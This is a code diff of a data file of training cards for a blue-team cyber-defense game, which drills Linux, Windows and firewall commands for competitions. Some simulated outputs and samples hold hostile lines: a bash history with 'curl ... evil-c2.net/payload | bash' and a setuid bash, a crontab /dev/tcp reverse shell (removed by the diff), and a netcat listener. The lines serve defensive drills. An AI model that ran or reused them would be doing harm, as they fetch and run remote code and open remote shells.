@@ -7,712 +7,669 @@ export const TUTORIAL_CARD: MicrogamePayload = {
   engine: 'TUTORIAL',
   timeLimitMs: 120000,
   category: 'Windows',
-  hint: 'Read the briefing and click START DAILY GAUNTLET',
+  hintNudge: 'Review the operational overview.',
+  hintSolution: 'Click START to begin your defense drills.',
   educationalNote: "You are the frontline defender. Fast incident response, calm composure under Red Team attacks, and constant communication make champions.",
   payload: {}
 };
 
 export const MICROGAME_QUEUE: MicrogamePayload[] = [
+  // ==========================================
+  // CHAPTER 1: LINUX TERMINAL FOUNDATIONS
+  // ==========================================
   {
-    id: 'multi-stage-1',
-    tier: 3,
-    category: 'Linux',
-    educationalNote: "Attackers often lock files with chattr or chmod to prevent you from removing their backdoors. You must first regain permissions, open the file, and manually strip the malicious variables.",
-    stages: [
-      {
-        verb: 'GRANT PERMS!',
-        engine: 'CLI_EXEC',
-        timeLimitMs: 12000,
-        hint: 'chmod 644 /etc/resolv.conf',
-        payload: { prompt: 'root@server:~#', successCommands: ['chmod 644 /etc/resolv.conf', 'chmod +w /etc/resolv.conf'] }
-      },
-      {
-        verb: 'OPEN EDITOR!',
-        engine: 'CLI_EXEC',
-        timeLimitMs: 8000,
-        hint: 'nano /etc/resolv.conf',
-        payload: { prompt: 'root@server:~#', successCommands: ['nano /etc/resolv.conf', 'vim /etc/resolv.conf'] }
-      },
-      {
-        verb: 'REMOVE MALICIOUS DNS!',
-        engine: 'CONFIG_EDIT',
-        timeLimitMs: 24000,
-        hint: 'Delete the 8.8.8.8 nameserver',
-        payload: { filename: '/etc/resolv.conf', initialContent: 'nameserver 10.0.0.1\nnameserver 8.8.8.8\nsearch localdomain', successRegex: '^\\s*nameserver 10\\.0\\.0\\.1[\\r\\n\\s]+search localdomain\\s*$' }
-      }
-    ]
-  },
-  {
-    id: 'cli-nav-linux',
-    tier: 2,
-    verb: 'LOCATE BACKDOOR!',
+    id: 'cli-linux-pwd',
+    tier: 1,
+    verb: 'PRINT WORKING DIRECTORY!',
     engine: 'CLI_EXEC',
-    timeLimitMs: 16000,
+    timeLimitMs: 11000,
     category: 'Linux',
-    hint: 'cd /var/www/html then rm shell.php',
-    educationalNote: "Navigation questions test your ability to navigate the filesystem before executing payloads. Attackers frequently drop PHP web shells like 'shell.php' into web root directories (/var/www/html) to maintain persistent HTTP access. Deleting them is step one of containment.",
-    payload: { 
-      prompt: 'root@web:~#', 
-      sequence: [
-        { command: 'cd /var/www/html', nextPrompt: 'root@web:/var/www/html#' },
-        { command: 'rm shell.php', simulatedOutput: '' }
-      ]
+    hintNudge: 'Print Working Directory shortcut.',
+    hintSolution: 'pwd',
+    educationalNote: "Running 'pwd' confirms your exact filesystem location before executing destructive commands.",
+    payload: {
+      prompt: 'root@server:~#',
+      successCommands: ['pwd'],
+      simulatedOutput: '/root'
     }
   },
   {
-    id: 'gui-nav-win',
-    tier: 3,
+    id: 'cli-linux-ls',
+    tier: 1,
+    verb: 'LIST DIRECTORY FILES!',
+    engine: 'CLI_EXEC',
+    timeLimitMs: 11000,
+    category: 'Linux',
+    hintNudge: 'Two-letter command to list files.',
+    hintSolution: 'ls',
+    educationalNote: "Listing directory contents helps spot suspicious scripts, hidden dotfiles, or rogue binaries.",
+    payload: {
+      prompt: 'root@server:~#',
+      successCommands: ['ls', 'ls -la', 'ls -l', 'ls -a', 'dir'],
+      simulatedOutput: '.bashrc  .profile  backdoor.sh  Desktop  Downloads'
+    }
+  },
+  {
+    id: 'cli-linux-cd',
+    tier: 1,
+    verb: 'CHANGE DIRECTORY!',
+    engine: 'CLI_EXEC',
+    timeLimitMs: 11000,
+    category: 'Linux',
+    hintNudge: 'Two letters for change directory.',
+    hintSolution: 'cd',
+    educationalNote: "Quick navigation between /var/log, /etc, and /tmp is fundamental to incident investigation.",
+    payload: {
+      prompt: 'root@server:~#',
+      successCommands: ['cd', 'cd ~', 'cd ..', 'cd /', 'cd /var/log', 'cd /tmp'],
+      simulatedOutput: ''
+    }
+  },
+  {
+    id: 'cli-linux-cat',
+    tier: 1,
+    verb: 'READ FILE CONTENTS!',
+    engine: 'CLI_EXEC',
+    timeLimitMs: 11000,
+    category: 'Linux',
+    hintNudge: 'Concatenate / view text file in terminal.',
+    hintSolution: 'cat',
+    educationalNote: "The 'cat' command prints file text directly to stdout, enabling rapid triage of logs and configs.",
+    payload: {
+      prompt: 'root@server:~#',
+      successCommands: ['cat', 'less', 'more', 'cat /etc/passwd', 'head', 'tail'],
+      simulatedOutput: 'root:x:0:0:root:/root:/bin/bash\nuser:x:1000:1000:user:/home/user:/bin/bash'
+    }
+  },
+  {
+    id: 'cli-linux-whoami',
+    tier: 1,
+    verb: 'WHO AM I?',
+    engine: 'CLI_EXEC',
+    timeLimitMs: 11000,
+    category: 'Linux',
+    hintNudge: 'Ask the shell who you are.',
+    hintSolution: 'whoami',
+    educationalNote: "Running 'whoami' immediately verifies whether you have obtained root (UID 0) privileges.",
+    payload: {
+      prompt: 'root@server:~#',
+      successCommands: ['whoami', 'id', 'id -u'],
+      simulatedOutput: 'root'
+    }
+  },
+  {
+    id: 'cli-linux-w',
+    tier: 1,
+    verb: 'WHO IS LOGGED IN?',
+    engine: 'CLI_EXEC',
+    timeLimitMs: 11000,
+    category: 'Linux',
+    hintNudge: 'Single letter command to inspect active sessions.',
+    hintSolution: 'w',
+    educationalNote: "The 'w' command instantly displays all active TTY sessions and source IPs connected to the system.",
+    payload: {
+      prompt: 'root@server:~#',
+      successCommands: ['w', 'who', 'users'],
+      simulatedOutput: ' 15:45:01 up 2 days,  1 user,  load average: 0.05, 0.03, 0.00\nUSER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT\nroot     pts/0    10.10.10.50      15:40    1.00s  0.02s  0.00s w'
+    }
+  },
+  {
+    id: 'cli-linux-clear',
+    tier: 1,
+    verb: 'CLEAR THE TERMINAL!',
+    engine: 'CLI_EXEC',
+    timeLimitMs: 11000,
+    category: 'Linux',
+    hintNudge: 'Clear terminal screen.',
+    hintSolution: 'clear',
+    educationalNote: "Clearing cluttered screens prevents misreading previous command outputs during intense engagements.",
+    payload: {
+      prompt: 'root@server:~#',
+      successCommands: ['clear', 'cls', 'reset'],
+      simulatedOutput: '\x1b[2J\x1b[H'
+    }
+  },
+  {
+    id: 'cli-linux-man',
+    tier: 1,
+    verb: 'OPEN MANUAL PAGE!',
+    engine: 'CLI_EXEC',
+    timeLimitMs: 11000,
+    category: 'Linux',
+    hintNudge: 'Short for manual page.',
+    hintSolution: 'man',
+    educationalNote: "Reading manual pages is how defenders quickly find flags, default configs, and security options.",
+    payload: {
+      prompt: 'root@server:~#',
+      successCommands: ['man', 'info', 'help', 'man man', 'man ufw'],
+      simulatedOutput: 'MAN(1)                        Manual pager utils                        MAN(1)'
+    }
+  },
+  {
+    id: 'cli-linux-history',
+    tier: 1,
+    verb: 'VIEW COMMAND HISTORY!',
+    engine: 'CLI_EXEC',
+    timeLimitMs: 11000,
+    category: 'Linux',
+    hintNudge: 'View your shell history.',
+    hintSolution: 'history',
+    educationalNote: "Checking bash history reveals commands run by attackers or teammates during the competition.",
+    payload: {
+      prompt: 'root@server:~#',
+      successCommands: ['history', 'cat ~/.bash_history'],
+      simulatedOutput: '  101  curl http://evil-c2.net/payload | bash\n  102  chmod +s /bin/bash\n  103  history'
+    }
+  },
+  {
+    id: 'cli-linux-uname',
+    tier: 1,
+    verb: 'CHECK KERNEL VERSION!',
+    engine: 'CLI_EXEC',
+    timeLimitMs: 11000,
+    category: 'Linux',
+    hintNudge: 'Unix name / kernel details.',
+    hintSolution: 'uname -a',
+    educationalNote: "Checking the kernel release identifies whether the system is vulnerable to Dirty COW, PwnKit, or other local privescs.",
+    payload: {
+      prompt: 'root@server:~#',
+      successCommands: ['uname -a', 'uname', 'uname -r', 'uname -mrs'],
+      simulatedOutput: 'Linux debian-bastion 6.12.0-amd64 #1 SMP PREEMPT_DYNAMIC x86_64 GNU/Linux'
+    }
+  },
+
+  // ==========================================
+  // CHAPTER 2: LINUX PROCESS & SERVICE CONTROL
+  // ==========================================
+  {
+    id: 'cli-linux-su',
+    tier: 1,
+    verb: 'SWITCH USER!',
+    engine: 'CLI_EXEC',
+    timeLimitMs: 11000,
+    category: 'Linux',
+    hintNudge: 'Two letters to Switch User.',
+    hintSolution: 'su',
+    educationalNote: "The 'su' utility allows switching to the root account or another operational account.",
+    payload: {
+      prompt: 'defender@server:~$',
+      successCommands: ['su', 'su -', 'su root'],
+      simulatedOutput: 'Password: \nroot@server:~#'
+    }
+  },
+  {
+    id: 'cli-linux-sudo',
+    tier: 1,
+    verb: 'RUN AS SUPERUSER!',
+    engine: 'CLI_EXEC',
+    timeLimitMs: 11000,
+    category: 'Linux',
+    hintNudge: 'Superuser do.',
+    hintSolution: 'sudo',
+    educationalNote: "Using 'sudo' lets authorized unprivileged users execute commands with root security privileges.",
+    payload: {
+      prompt: 'defender@server:~$',
+      successCommands: ['sudo', 'sudo -i', 'sudo su', 'sudo bash'],
+      simulatedOutput: '[sudo] password for defender: \nroot@server:~#'
+    }
+  },
+  {
+    id: 'cli-linux-ps',
+    tier: 2,
+    verb: 'LIST ALL PROCESSES!',
+    engine: 'CLI_EXEC',
+    timeLimitMs: 11000,
+    category: 'Linux',
+    hintNudge: 'Process status with aux flags.',
+    hintSolution: 'ps aux',
+    educationalNote: "'ps aux' reveals all running processes, their parent PIDs, owners, and complete CLI command lines.",
+    payload: {
+      prompt: 'root@server:~#',
+      successCommands: ['ps aux', 'ps -ef', 'ps', 'top'],
+      simulatedOutput: 'USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nroot         1  0.0  0.2 168432 11928 ?        Ss   12:00   0:01 /sbin/init\nwww-data  1337  1.2  0.1  25800  4212 ?        S    12:05   0:00 /dev/shm/nc -lvnp 4444'
+    }
+  },
+  {
+    id: 'cli-linux-top',
+    tier: 1,
+    verb: 'MONITOR REAL-TIME PROCESSES!',
+    engine: 'CLI_EXEC',
+    timeLimitMs: 11000,
+    category: 'Linux',
+    hintNudge: 'Real-time process viewer.',
+    hintSolution: 'top',
+    educationalNote: "'top' or 'htop' shows dynamic live CPU and RAM consumption, making crypto-miners immediately obvious.",
+    payload: {
+      prompt: 'root@server:~#',
+      successCommands: ['top', 'htop', 'btop'],
+      simulatedOutput: 'top - 15:45:00 up 2 days,  1 user,  load average: 0.12, 0.08, 0.02\nTasks: 142 total,   1 running, 141 sleeping'
+    }
+  },
+  {
+    id: 'cli-linux-kill',
+    tier: 2,
+    verb: 'TERMINATE PROCESS BY PID!',
+    engine: 'CLI_EXEC',
+    timeLimitMs: 11000,
+    category: 'Linux',
+    hintNudge: 'Command to kill a PID.',
+    hintSolution: 'kill',
+    educationalNote: "The 'kill' command sends SIGTERM (or SIGKILL with -9) to forcibly stop unauthorized processes.",
+    payload: {
+      prompt: 'root@server:~#',
+      successCommands: ['kill', 'kill -9', 'kill 1337', 'kill -9 1337'],
+      simulatedOutput: '[1]+  Terminated              nc -lvnp 4444'
+    }
+  },
+  {
+    id: 'cli-linux-pkill',
+    tier: 2,
+    verb: 'KILL PROCESS BY NAME!',
+    engine: 'CLI_EXEC',
+    timeLimitMs: 11000,
+    category: 'Linux',
+    hintNudge: 'Kill process by pattern or name.',
+    hintSolution: 'pkill',
+    educationalNote: "'pkill' terminates processes matching a regex name (e.g., 'pkill nc' or 'killall apache2').",
+    payload: {
+      prompt: 'root@server:~#',
+      successCommands: ['pkill', 'killall', 'pkill -9', 'pkill nc', 'killall nc'],
+      simulatedOutput: ''
+    }
+  },
+  {
+    id: 'cli-linux-chmod',
+    tier: 1,
+    verb: 'CHANGE FILE PERMISSIONS!',
+    engine: 'CLI_EXEC',
+    timeLimitMs: 11000,
+    category: 'Linux',
+    hintNudge: 'Change mode of files.',
+    hintSolution: 'chmod',
+    educationalNote: "'chmod' sets read, write, and execute bits. Stripping +x from web shells neutralizes them instantly.",
+    payload: {
+      prompt: 'root@server:~#',
+      successCommands: ['chmod', 'chmod +x', 'chmod 755', 'chmod 600', 'chmod 644'],
+      simulatedOutput: ''
+    }
+  },
+  {
+    id: 'cli-linux-chown',
+    tier: 1,
+    verb: 'CHANGE FILE OWNER!',
+    engine: 'CLI_EXEC',
+    timeLimitMs: 11000,
+    category: 'Linux',
+    hintNudge: 'Change owner command.',
+    hintSolution: 'chown',
+    educationalNote: "'chown' reclaims ownership of hijacked directories so attackers lose write permission.",
+    payload: {
+      prompt: 'root@server:~#',
+      successCommands: ['chown', 'chown root', 'chown root:root', 'chown -R root:root'],
+      simulatedOutput: ''
+    }
+  },
+  {
+    id: 'cli-linux-systemctl-status',
+    tier: 2,
+    verb: 'CHECK SERVICE STATUS!',
+    engine: 'CLI_EXEC',
+    timeLimitMs: 11000,
+    category: 'Linux',
+    hintNudge: 'Systemd control service status.',
+    hintSolution: 'systemctl status',
+    educationalNote: "Checking service status ensures scoring services (SSH, Web, DNS) stay active during SLA evaluation.",
+    payload: {
+      prompt: 'root@server:~#',
+      successCommands: ['systemctl status', 'systemctl', 'service status', 'service --status-all'],
+      simulatedOutput: '● nginx.service - A high performance web server and a reverse proxy server\n   Loaded: loaded (/lib/systemd/system/nginx.service; enabled)\n   Active: active (running)'
+    }
+  },
+  {
+    id: 'cli-linux-systemctl-restart',
+    tier: 2,
+    verb: 'RESTART A SERVICE!',
+    engine: 'CLI_EXEC',
+    timeLimitMs: 11000,
+    category: 'Linux',
+    hintNudge: 'Systemctl restart command.',
+    hintSolution: 'systemctl restart',
+    educationalNote: "Restarting services applies updated configuration files and flushes corrupted workers.",
+    payload: {
+      prompt: 'root@server:~#',
+      successCommands: ['systemctl restart', 'service restart', 'systemctl reload'],
+      simulatedOutput: ''
+    }
+  },
+
+  // ==========================================
+  // CHAPTER 3: WINDOWS & POWERSHELL ESSENTIALS
+  // ==========================================
+  {
+    id: 'cli-win-get-process',
+    tier: 1,
+    verb: 'LIST WINDOWS PROCESSES!',
+    engine: 'CLI_EXEC',
+    timeLimitMs: 11000,
+    category: 'Windows',
+    hintNudge: 'PowerShell cmdlet to get processes.',
+    hintSolution: 'Get-Process',
+    educationalNote: "Get-Process lists all active Windows processes and handles for threat inspection.",
+    payload: {
+      prompt: 'PS C:\\Windows\\system32>',
+      successCommands: ['Get-Process', 'gps', 'ps', 'tasklist'],
+      simulatedOutput: 'Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName\n-------  ------    -----      -----     ------     --  -- -----------\n    412      24    31420      45210       1.24   4812   1 powershell'
+    }
+  },
+  {
+    id: 'cli-win-get-service',
+    tier: 1,
+    verb: 'LIST WINDOWS SERVICES!',
+    engine: 'CLI_EXEC',
+    timeLimitMs: 11000,
+    category: 'Windows',
+    hintNudge: 'PowerShell cmdlet to get services.',
+    hintSolution: 'Get-Service',
+    educationalNote: "Get-Service reveals which Windows services are running, stopped, or set to start automatically.",
+    payload: {
+      prompt: 'PS C:\\Windows\\system32>',
+      successCommands: ['Get-Service', 'gsv', 'sc query', 'services.msc'],
+      simulatedOutput: 'Status   Name               DisplayName\n------   ----               -----------\nRunning  LanmanServer       Server\nRunning  WinDefend          Microsoft Defender Antivirus Service'
+    }
+  },
+  {
+    id: 'cli-win-stop-service',
+    tier: 2,
+    verb: 'STOP A WINDOWS SERVICE!',
+    engine: 'CLI_EXEC',
+    timeLimitMs: 11000,
+    category: 'Windows',
+    hintNudge: 'PowerShell cmdlet to stop a service.',
+    hintSolution: 'Stop-Service',
+    educationalNote: "Stopping vulnerable services like LanmanServer halts lateral SMB attacks like EternalBlue.",
+    payload: {
+      prompt: 'PS C:\\Windows\\system32>',
+      successCommands: ['Stop-Service', 'net stop', 'sc stop', 'Stop-Service -Name LanmanServer'],
+      simulatedOutput: 'Service LanmanServer stopped.'
+    }
+  },
+  {
+    id: 'cli-win-start-service',
+    tier: 2,
+    verb: 'START A WINDOWS SERVICE!',
+    engine: 'CLI_EXEC',
+    timeLimitMs: 11000,
+    category: 'Windows',
+    hintNudge: 'PowerShell cmdlet to start a service.',
+    hintSolution: 'Start-Service',
+    educationalNote: "Restoring scored services keeps inject and SLA points flowing during the competition.",
+    payload: {
+      prompt: 'PS C:\\Windows\\system32>',
+      successCommands: ['Start-Service', 'net start', 'sc start', 'Start-Service -Name W32Time'],
+      simulatedOutput: 'Service W32Time started.'
+    }
+  },
+  {
+    id: 'cli-win-net-user',
+    tier: 1,
+    verb: 'LIST LOCAL WINDOWS USERS!',
+    engine: 'CLI_EXEC',
+    timeLimitMs: 11000,
+    category: 'Windows',
+    hintNudge: 'CMD command to view user accounts.',
+    hintSolution: 'net user',
+    educationalNote: "'net user' reveals all local accounts, helping you detect rogue accounts created by attackers.",
+    payload: {
+      prompt: 'PS C:\\Windows\\system32>',
+      successCommands: ['net user', 'net users', 'Get-LocalUser'],
+      simulatedOutput: 'User accounts for \\\\WIN-DEFENDER\n-------------------------------------------------------------------------------\nAdministrator            Guest                    DefaultAccount\nbackdoor_admin           Defender\nThe command completed successfully.'
+    }
+  },
+  {
+    id: 'cli-win-whoami-priv',
+    tier: 2,
+    verb: 'CHECK USER PRIVILEGES!',
+    engine: 'CLI_EXEC',
+    timeLimitMs: 11000,
+    category: 'Windows',
+    hintNudge: 'Whoami with privileges flag.',
+    hintSolution: 'whoami /priv',
+    educationalNote: "'whoami /priv' displays enabled privileges like SeDebugPrivilege or SeImpersonatePrivilege.",
+    payload: {
+      prompt: 'PS C:\\Windows\\system32>',
+      successCommands: ['whoami /priv', 'whoami -priv', 'whoami', 'whoami /all'],
+      simulatedOutput: 'PRIVILEGES INFORMATION\n----------------------\nPrivilege Name                Description                          State\n============================= ==================================== ========\nSeDebugPrivilege              Debug programs                       Enabled\nSeShutdownPrivilege           Shut down the system                 Enabled'
+    }
+  },
+  {
+    id: 'cli-win-tasklist',
+    tier: 1,
+    verb: 'VIEW TASKLIST!',
+    engine: 'CLI_EXEC',
+    timeLimitMs: 11000,
+    category: 'Windows',
+    hintNudge: 'Standard Windows task list tool.',
+    hintSolution: 'tasklist',
+    educationalNote: "'tasklist' works in basic cmd.exe prompts without requiring PowerShell.",
+    payload: {
+      prompt: 'C:\\Windows\\system32>',
+      successCommands: ['tasklist', 'tasklist /v', 'Get-Process'],
+      simulatedOutput: 'Image Name                     PID Session Name        Session#    Mem Usage\n========================= ======== ================ =========== ============\nSystem Idle Process              0 Services                   0          8 K\ncmd.exe                       3920 Console                    1      3,412 K'
+    }
+  },
+  {
+    id: 'cli-win-taskkill',
+    tier: 2,
+    verb: 'KILL TASK BY NAME!',
+    engine: 'CLI_EXEC',
+    timeLimitMs: 11000,
+    category: 'Windows',
+    hintNudge: 'CMD utility to kill tasks.',
+    hintSolution: 'taskkill',
+    educationalNote: "'taskkill /f /im payload.exe' forcefully kills malware processes across all Windows sessions.",
+    payload: {
+      prompt: 'C:\\Windows\\system32>',
+      successCommands: ['taskkill', 'taskkill /f /im', 'taskkill /im', 'Stop-Process'],
+      simulatedOutput: 'SUCCESS: Sent termination signal to process.'
+    }
+  },
+  {
+    id: 'cli-win-restart',
+    tier: 1,
+    verb: 'RESTART THE COMPUTER!',
+    engine: 'CLI_EXEC',
+    timeLimitMs: 11000,
+    category: 'Windows',
+    hintNudge: 'PowerShell Restart-Computer or shutdown /r.',
+    hintSolution: 'Restart-Computer',
+    educationalNote: "Restarting clears unpersisted in-memory implants and ensures boot configurations take effect.",
+    payload: {
+      prompt: 'PS C:\\Windows\\system32>',
+      successCommands: ['Restart-Computer', 'shutdown /r', 'shutdown -r', 'shutdown /r /t 0'],
+      simulatedOutput: 'System restart scheduled.'
+    }
+  },
+  {
+    id: 'gui-win-defender',
+    tier: 2,
     verb: 'ENABLE DEFENDER!',
     engine: 'GUI_NAV',
-    timeLimitMs: 15000,
+    timeLimitMs: 11000,
     category: 'Windows',
-    hint: 'Settings then Update & Security then Windows Security then Virus & Threat Protection then Manage Settings then Real-time Protection',
-    educationalNote: "Red team's first move upon gaining access to a Windows box is to disable Windows Defender. Re-enabling Real-time protection ensures that known malicious payloads and C2 agents are automatically quarantined before they can execute. You must memorize this settings path to rapidly re-secure Windows boxes.",
+    hintNudge: 'Navigate to Windows Security Settings.',
+    hintSolution: 'Update & Security > Windows Security',
+    educationalNote: "Re-enabling real-time protection ensures known malware beacons are automatically quarantined.",
     payload: {
       windowTitle: 'Windows Settings',
       steps: [
         { correctOption: 'Update & Security', options: ['System', 'Personalization', 'Update & Security', 'Network & Internet'] },
-        { correctOption: 'Windows Security', options: ['Delivery Optimization', 'Windows Security', 'Backup', 'Troubleshoot'] },
-        { correctOption: 'Virus & Threat Protection', options: ['Account Protection', 'Firewall & Network', 'Virus & Threat Protection', 'Device Security'] },
-        { correctOption: 'Manage Settings', options: ['Scan Options', 'Manage Settings', 'Protection Updates', 'Ransomware Protection'] }
+        { correctOption: 'Windows Security', options: ['Delivery Optimization', 'Windows Security', 'Backup', 'Troubleshoot'] }
       ],
       finalToggle: { label: 'Real-time Protection' }
     }
   },
+
+  // ==========================================
+  // CHAPTER 4: NETWORK & FIREWALL DEFENSE
+  // ==========================================
   {
-    id: 'mc-linux',
+    id: 'cli-net-ip',
     tier: 1,
-    verb: 'ANALYZE LOG!',
-    engine: 'MULTIPLE_CHOICE',
-    timeLimitMs: 15000,
-    category: 'Linux',
-    hint: 'Look at the HTTP status code',
-    educationalNote: "HTTP status codes tell the story of an attack. A 401 indicates Unauthorized (a failed login attempt), and 404 indicates Not Found (directory brute forcing). A 302 Found or 200 OK after a POST request to a login portal means the attacker successfully guessed the password and was redirected to the dashboard.",
+    verb: 'CHECK IP ADDRESSES!',
+    engine: 'CLI_EXEC',
+    timeLimitMs: 11000,
+    category: 'Firewall',
+    hintNudge: 'Check IP address command.',
+    hintSolution: 'ip a',
+    educationalNote: "'ip a' or 'ifconfig' maps your network interfaces, subnets, and active gateway assignments.",
     payload: {
-      question: "Which of the following Apache access log entries indicates a SUCCESSFUL brute-force login?",
-      options: [
-        { text: "192.168.1.50 - - [07/Oct/2026:12:00:01] \"POST /login.php HTTP/1.1\" 401 532", isCorrect: false, feedback: "401 means Unauthorized. The login failed." },
-        { text: "192.168.1.50 - - [07/Oct/2026:12:00:05] \"POST /login.php HTTP/1.1\" 403 233", isCorrect: false, feedback: "403 means Forbidden. They didn't get in." },
-        { text: "192.168.1.50 - - [07/Oct/2026:12:00:08] \"POST /login.php HTTP/1.1\" 302 0", isCorrect: true },
-        { text: "192.168.1.50 - - [07/Oct/2026:12:00:10] \"GET /admin HTTP/1.1\" 404 123", isCorrect: false, feedback: "404 means Not Found. The admin page isn't even there." }
-      ]
+      prompt: 'root@server:~#',
+      successCommands: ['ip a', 'ip addr', 'ifconfig', 'ip address', 'ipconfig'],
+      simulatedOutput: '1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536\n2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 inet 192.168.1.50/24'
     }
   },
   {
-    id: 'cli-fw',
-    tier: 3,
-    verb: 'BLOCK IP!',
+    id: 'cli-net-ss',
+    tier: 2,
+    verb: 'LIST LISTENING PORTS!',
     engine: 'CLI_EXEC',
-    timeLimitMs: 14000,
+    timeLimitMs: 11000,
     category: 'Firewall',
-    hint: 'ufw deny from {{IP}}',
-    educationalNote: "Rapidly dropping inbound connections from an active C2 IP is step 1 of Incident Response. Uncomplicated Firewall (ufw) is the default frontend for iptables on Ubuntu systems. Memorizing this command is critical to severing a red team member's active connection during an engagement.",
-    variables: { IP: ['10.10.10.50', '192.168.1.100', '172.16.5.5', '8.8.8.8'] },
-    payload: { prompt: 'root@edge-router:~#', successCommands: ['ufw deny from {{IP}}', 'iptables -A INPUT -s {{IP}} -j DROP'], simulatedOutput: 'Rule added\nRule added (v6)' }
-  },
-  {
-    id: 'cfg-linux',
-    tier: 2,
-    verb: 'NUKE CRON!',
-    engine: 'CONFIG_EDIT',
-    timeLimitMs: 15000,
-    category: 'Linux',
-    hint: "Delete the top line entirely, leaving only '# DO NOT EDIT'",
-    educationalNote: "Crontab is Linux's built-in task scheduler, making it a prime target for persistence. Attackers frequently use crontabs to establish persistent reverse shells that beacon out to their C2 server every minute. Wiping rogue entries from /var/spool/cron ensures the attacker doesn't instantly regain access after you kill their shell.",
-    payload: { filename: '/var/spool/cron/crontabs/root', initialContent: '* * * * * /bin/bash -c "bash -i >& /dev/tcp/10.10.10.10/4444 0>&1"\n# DO NOT EDIT\n', successRegex: '^\\s*#\\s*DO NOT EDIT\\s*$' }
-  },
-  {
-    id: 'cli-win',
-    tier: 2,
-    verb: 'STOP SMB!',
-    engine: 'CLI_EXEC',
-    timeLimitMs: 12000,
-    category: 'Windows',
-    hint: 'Stop-Service -Name {{SERVICE}} -Force',
-    educationalNote: "The Server Message Block (SMB) protocol is notoriously exploited for lateral movement across Windows networks using techniques like Pass-the-Hash or EternalBlue. If you suspect an active breach, stopping the LanmanServer service halts SMB traffic entirely, buying you time to patch.",
-    variables: { SERVICE: ['LanmanServer', 'LanmanWorkstation'] },
-    payload: { prompt: 'PS C:\\Windows\\system32>', successCommands: ['Stop-Service -Name {{SERVICE}} -Force', 'net stop {{SERVICE}}'], simulatedOutput: 'Service {{SERVICE}} has been stopped successfully.' }
-  },
-  {
-    id: 'cfg-fw',
-    tier: 1,
-    verb: 'FIX FIREWALL!',
-    engine: 'CONFIG_EDIT',
-    timeLimitMs: 15000,
-    category: 'Firewall',
-    hint: 'Change ENABLED=no to ENABLED=yes',
-    educationalNote: "A classic red team move is to simply disable the UFW service on boot via its configuration file. Leaving a firewall disabled allows an attacker to pivot freely across all ports. Changing 'ENABLED=yes' ensures the firewall applies its default DROP rules upon system restart.",
-    payload: { filename: '/etc/ufw/ufw.conf', initialContent: '# /etc/ufw/ufw.conf\nENABLED=no\nLOGLEVEL=low', successRegex: 'ENABLED=yes' }
-  },
-  {
-    id: 'cfg-inject',
-    tier: 3,
-    verb: 'FIX SMTP RELAY!',
-    engine: 'CONFIG_EDIT',
-    timeLimitMs: 18000,
-    category: 'Injects',
-    hint: 'Set relayhost to {{RELAY_IP}}',
-    educationalNote: "In CCDC, 'Injects' are business tasks you must complete to earn points. A common inject is configuring your local Postfix mail server to route all outbound mail through a central scoring relay. Failing to properly configure the 'relayhost' directive means your team fails the SLA and loses points.",
-    variables: { RELAY_IP: ['10.0.0.5', '192.168.1.5', '172.16.0.5'] },
-    payload: { filename: '/etc/postfix/main.cf', initialContent: 'smtpd_banner = $myhostname ESMTP\nrelayhost = 0.0.0.0\ninet_interfaces = all', successRegex: 'relayhost = {{RELAY_IP}}' }
-  },
-  {
-    id: 'sb-1',
-    tier: 1,
-    verb: 'TAKE A BREATH!',
-    engine: 'STUDY_BREAK',
-    timeLimitMs: 15000,
-    category: 'Windows',
-    educationalNote: "Just a reminder to breathe! In a real competition, communication is more important than typing fast.",
-    payload: { fact: "Fun Fact: The very first CCDC competition was held in 2005. The average time a red team takes to breach an unpatched system is under 15 minutes." }
-  },
-  {
-    id: 'cli-linux-temp',
-    tier: 1,
-    verb: 'FIND TEMP FILES!',
-    engine: 'CLI_EXEC',
-    timeLimitMs: 14000,
-    category: 'Linux',
-    hint: 'find /tmp /var/tmp /dev/shm -type f',
-    educationalNote: "Attackers drop staging payloads in /dev/shm or /tmp because they execute in RAM and often avoid disk write logs. Scanning these directories is a crucial first step in threat hunting.",
-    payload: { prompt: 'root@server:~#', successCommands: ['find /tmp /var/tmp /dev/shm -type f'] }
-  },
-  {
-    id: 'cli-linux-conn',
-    tier: 2,
-    verb: 'VIEW CONNECTIONS!',
-    engine: 'CLI_EXEC',
-    timeLimitMs: 12000,
-    category: 'Linux',
-    hint: 'ss -tulpn',
-    educationalNote: "The 'ss -tulpn' command is the fastest way to map out exactly what ports are listening and what processes are bound to them. You must run this immediately to find rogue backdoors.",
-    payload: { prompt: 'root@server:~#', successCommands: ['ss -tulpn', 'netstat -tulpn'] }
-  },
-  {
-    id: 'cli-linux-who',
-    tier: 1,
-    verb: 'WHO IS LOGGED IN?',
-    engine: 'CLI_EXEC',
-    timeLimitMs: 8000,
-    category: 'Linux',
-    hint: 'w',
-    educationalNote: "Running 'w' or 'who' instantly shows you all active TTY sessions. If you see an unknown IP connected, red team is currently in the box with you.",
-    payload: { prompt: 'root@server:~#', successCommands: ['w', 'who'] }
-  },
-  {
-    id: 'cli-win-pass',
-    tier: 1,
-    verb: 'CHANGE ADMIN PASS!',
-    engine: 'CLI_EXEC',
-    timeLimitMs: 12000,
-    category: 'Windows',
-    hint: 'net user administrator "{{NEW_PASS}}"',
-    educationalNote: "In Phase 1 of CCDC, changing the default Administrator password is the highest priority. If you don't lock them out, the red team will establish persistence in seconds.",
-    variables: { NEW_PASS: ['P@ssw0rd123!', 'CyberDefender99!', 'B!u3T3@m2026', 'S3cur3P@ss!'] },
-    payload: { prompt: 'PS C:\\Windows\\system32>', successCommands: ['net user administrator "{{NEW_PASS}}"'] }
-  },
-  {
-    id: 'cli-win-tasks',
-    tier: 2,
-    verb: 'LIST ACTIVE TASKS!',
-    engine: 'CLI_EXEC',
-    timeLimitMs: 15000,
-    category: 'Windows',
-    hint: 'Get-ScheduledTask -State Running',
-    educationalNote: "Scheduled tasks are the number one persistence mechanism on Windows. Listing running tasks will quickly highlight suspicious reverse shells beaconing back to C2.",
-    payload: { prompt: 'PS C:\\Windows\\system32>', successCommands: ['Get-ScheduledTask -State Running', 'schtasks /query /TN * | findstr "Running"'] }
-  },
-  {
-    id: 'cfg-linux-ssh',
-    tier: 2,
-    verb: 'SECURE SSH PORT!',
-    engine: 'CONFIG_EDIT',
-    timeLimitMs: 15000,
-    category: 'Linux',
-    hint: 'Change Port {{ROGUE_PORT}} to Port 22',
